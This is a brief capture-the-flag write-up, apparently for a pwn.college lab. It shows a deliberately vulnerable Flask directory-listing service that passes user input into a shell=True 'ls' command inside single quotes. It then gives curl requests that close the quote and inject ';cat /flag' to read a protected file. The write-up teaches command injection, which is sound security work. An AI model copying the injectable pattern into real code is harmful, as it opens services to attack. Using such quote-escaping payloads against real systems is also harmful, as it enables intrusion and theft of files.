This one has a command that's enclosed by a pair of `'` characters.

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET"])
def challenge():
    directory = flask.request.args.get("directory", "/challenge")
    command = f"ls -l '{directory}'"
    print(f"DEBUG: {command=}")

    listing = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of: ls -l '{directory}'</b><br>
        <pre>{listing}</pre>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

So all we need to do is to break out of that ending `'` to inject our commands. We can do this by inserting some quotes to create another pair of quotes, letting us insert our commands in between the 2 pairs of quotes:

```bash
curl -v "http://challenge.localhost:80/?directory=/''"
```

This works with no errors. So we can now inject our command in to this:

```bash
curl -v "http://challenge.localhost:80/?directory=/'%3bcat%20/flag'"
```